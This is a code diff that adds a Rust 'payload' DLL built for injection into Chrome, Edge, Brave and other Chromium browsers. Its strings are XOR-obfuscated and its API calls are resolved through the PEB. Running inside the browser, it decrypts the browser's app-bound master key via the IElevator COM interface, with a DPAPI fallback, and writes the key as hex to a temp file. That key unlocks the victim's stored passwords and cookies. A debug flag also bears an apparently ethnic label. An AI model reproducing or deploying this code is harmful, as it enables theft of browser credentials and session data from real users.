@@ -1,0 +1,254 @@
+//! Chrome Recovery Payload DLL
+//!
+//! Injected into a Chromium-based browser process. Runs inside the browser's
+//! security identity so IElevator accepts our COM call. Supports all major
+//! Chromium browsers (Chrome, Edge, Brave, Opera, Vivaldi, Yandex, etc.).
+
+#![allow(non_snake_case, unused)]
+
+mod elv;
+mod dpflbck;
+mod reflective_loader;
+mod peb;
+pub mod xor;
+
+use std::{path::PathBuf};
+use crate::xor::decode as obf_decode;
+
+const LOCAL_STATE: &str = "1635393b367a092e3b2e3f";
+const APP_BOUND_KEY: &str = "3b2a2a0538352f343e053f343928232a2e3f3e05313f23";
+const RESULT_ENV: &str = "19120815171f05081f19150c1f080305081f090f160e";
+const USER_DATA_ENV: &str = "19120815171f05081f19150c1f0803050f091f08051e1b0e1b05081f16";
+const DATA_ROOT_ENV: &str = "19120815171f05081f19150c1f0803051e1b0e1b050815150e";
+
+fn get_envVar(s: &str) -> Option<String> {
+    let decoded = obf_decode(s);
+    std::env::var(&decoded).ok()
+}
+
+type BOOL = i32;
+type HINSTANCE = *mut std::ffi::c_void;
+const TRUE: BOOL = 1;
+
+pub static mut G_K32_BASE: *mut u8 = std::ptr::null_mut();
+const DLL_PROCESS_ATTACH: u32 = 1;
+
+type CreateThreadFn = unsafe extern "system" fn(
+    *mut std::ffi::c_void,
+    usize,
+    Option<unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>,
+    *mut std::ffi::c_void,
+    u32,
+    *mut u32,
+) -> *mut std::ffi::c_void;
+
+fn get_create_thread() -> Option<CreateThreadFn> {
+    let k32 = unsafe { G_K32_BASE };
+    let kernel32 = if !k32.is_null() { k32 } else { peb::get_module_base("kernel32.dll")? };
+    let addr = peb::resolve_export(kernel32, "CreateThread")?;
+    Some(unsafe { std::mem::transmute(addr) })
+}
+
+const APPB: &[u8; 4] = b"APPB";
+
+const PAYLOAD_DEBUG: bool = {
+    match option_env!("JEWISH_DEBUG") {
+        Some(v) => v.len() == 1 && v.as_bytes()[0] == 49u8,
+        None => false,
+    }
+};
+
+#[no_mangle]
+pub unsafe extern "system" fn DllMain(
+    _h: HINSTANCE,
+    reason: u32,
+    _: *mut std::ffi::c_void,
+) -> BOOL {
+    if reason == DLL_PROCESS_ATTACH {
+        if PAYLOAD_DEBUG {
+            let log_path = std::env::temp_dir().join("payload_debug.log");
+            let _ = std::fs::write(&log_path, format!("DllMain PROCESS_ATTACH pid={}\n", std::process::id()));
+            if let Some(create_thread) = get_create_thread() {
+                let _ = std::fs::write(&log_path, format!("DllMain got CreateThread, spawning worker\n"));
+                create_thread(
+                    std::ptr::null_mut(),
+                    0,
+                    Some(worker),
+                    std::ptr::null_mut(),
+                    0,
+                    std::ptr::null_mut(),
+                );
+            } else {
+                let _ = std::fs::write(&log_path, b"DllMain FAILED to resolve CreateThread\n");
+            }
+        } else if let Some(create_thread) = get_create_thread() {
+            create_thread(
+                std::ptr::null_mut(),
+                0,
+                Some(worker),
+                std::ptr::null_mut(),
+                0,
+                std::ptr::null_mut(),
+            );
+        }
+    }
+    TRUE
+}
+
+unsafe extern "system" fn worker(_: *mut std::ffi::c_void) -> u32 {
+    if PAYLOAD_DEBUG { step(0, "worker started"); }
+    std::thread::sleep(std::time::Duration::from_millis(1500));
+    if PAYLOAD_DEBUG { step(0, "worker delay done, calling run()"); }
+    let r = std::panic::catch_unwind(|| run());
+    match r {
+        Ok(Ok(())) => { if PAYLOAD_DEBUG { step(99, "run() OK"); } }
+        Ok(Err(e)) => { if PAYLOAD_DEBUG { step(99, &format!("run() ERR: {e}")); } write_error(&e); }
+        Err(_) => { if PAYLOAD_DEBUG { step(99, "PANIC"); } write_error("panic in payload"); }
+    }
+    0
+}
+
+pub(crate) fn step(n: u32, msg: &str) {
+    if !PAYLOAD_DEBUG { return; }
+    use std::io::Write;
+    let paths = [
+        std::env::temp_dir().join(format!("payload_step_{}.log", std::process::id())),
+        std::env::temp_dir().join("payload_debug.log"),
+    ];
+    for p in &paths {
+        if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open(p) {
+            let _ = writeln!(f, "step {n}: {msg}");
+            let _ = f.flush();
+        }
+    }
+}
+
+fn run() -> Result<(), String> {
+    step(1, "start");
+
+    let exe = std::env::current_exe()
+        .map(|p| p.to_string_lossy().to_lowercase())
+        .unwrap_or_default();
+    step(2, &format!("exe={exe}"));
+
+    let local_state_path = resolve_local_state_path(&exe)?;
+    step(3, &format!("ls_path={}", local_state_path.display()));
+
+    let raw = std::fs::read_to_string(&local_state_path)
+        .map_err(|e| format!("read Local State: {e}"))?;
+    step(4, &format!("raw.len={}", raw.len()));
+
+    let key_b64 = {
+        let marker = format!("\"{}\":\"", obf_decode(APP_BOUND_KEY));
+        if let Some(start) = raw.find(&marker) {
+            let start = start + marker.len();
+            if let Some(end) = raw[start..].find('"') {
+                &raw[start..start + end]
+            } else {
+                return Err(format!("unterminated {}", obf_decode(APP_BOUND_KEY))).into();
+            }
+        } else {
+            return Err(format!("{} not found", obf_decode(APP_BOUND_KEY))).into();
+        }
+    };
+    step(5, "got key_b64");
+
+    let encrypted_key = base64::Engine::decode(
+        &base64::engine::general_purpose::STANDARD,
+        key_b64,
+    )
+    .map_err(|e| format!("base64 decode: {e}"))?;
+    step(6, &format!("key.len={}", encrypted_key.len()));
+
+    if encrypted_key.len() < 4 {
+        return Err("encrypted key too short".into());
+    }
+    if !encrypted_key.starts_with(APPB) {
+        return Err("missing APPB prefix on app_bound_encrypted_key".into());
+    }
+    let encrypted_key = &encrypted_key[4..];
+    step(7, "APPB stripped");
+
+    let browser = elv::resolve_browser(&exe);
+    let browser_label = browser.map(|b| b.name).unwrap_or("Chromium");
+    step(8, &format!("browser_resolved name={browser_label}"));
+
+    let com_result = if let Some(b) = browser {
+        elv::decrypt_for_browser(b, encrypted_key)
+    } else {
+        elv::decrypt_app_bound_key(encrypted_key)
+    };
+    step(9, &format!("com_result ok={}", com_result.is_ok()));
+
+    let master_key = com_result.or_else(|_| {
+        let r = dpflbck::try_decrypt_app_bound(encrypted_key);
+        r.ok_or_else(|| String::from("dpapi fallback failed"))
+    })
+    .map_err(|e| format!("key recovery: {e}"))?;
+
+    if master_key.len() != 32 {
+        return Err(format!(
+            "unexpected key length: {} (want 32)",
+            master_key.len()
+        ));
+    }
+    step(10, "key length ok");
+
+    let hex_str: String = master_key.iter().map(|b| format!("{b:02x}")).collect();
+    let json = format!(
+        "{{\"browser\":\"{}\",\"master_key_hex\":\"{}\"}}",
+        browser_label, hex_str
+    );
+
+    let path = result_path();
+    std::fs::write(&path, &json).map_err(|e| format!("write result: {e}"))?;
+    step(11, "result written");
+    Ok(())
+}
+
+fn resolve_local_state_path(exe: &str) -> Result<PathBuf, String> {
+    if let Some(rel) = get_envVar(USER_DATA_ENV) {
+        let root = match get_envVar(DATA_ROOT_ENV).as_deref() {
+            Some("roaming") => std::env::var("APPDATA"),
+            _ => std::env::var("LOCALAPPDATA"),
+        }
+        .map_err(|_| "APPDATA/LOCALAPPDATA not set")?;
+
+        let path = PathBuf::from(&root).join(&rel).join(obf_decode(LOCAL_STATE));
+        if path.exists() {
+            return Ok(path);
+        }
+        return Err(format!("Local State not found: {}", path.display()));
+    }
+
+    let browser = elv::resolve_browser(exe)
+        .ok_or_else(|| format!("could not detect browser from exe path: {exe}"))?;
+
+    let local_appdata =
+        std::env::var("LOCALAPPDATA").map_err(|_| "LOCALAPPDATA not set")?;
+
+    let local_state_path = PathBuf::from(&local_appdata)
+        .join(browser.user_data_rel)
+        .join(obf_decode(LOCAL_STATE));
+
+    if !local_state_path.exists() {
+        return Err(format!(
+            "Local State not found: {}",
+            local_state_path.display()
+        ));
+    }
+    Ok(local_state_path)
+}
+
+fn result_path() -> PathBuf {
+    if let Some(p) = get_envVar(RESULT_ENV) {
+        return PathBuf::from(p);
+    }
+    std::env::temp_dir().join("chrome_recovery_result.json")
+}
+
+fn write_error(msg: &str) {
+    let json = format!("{{\"error\":\"{}\"}}", msg);
+    let p = result_path();
+    let _ = std::fs::write(&p, &json);
+}
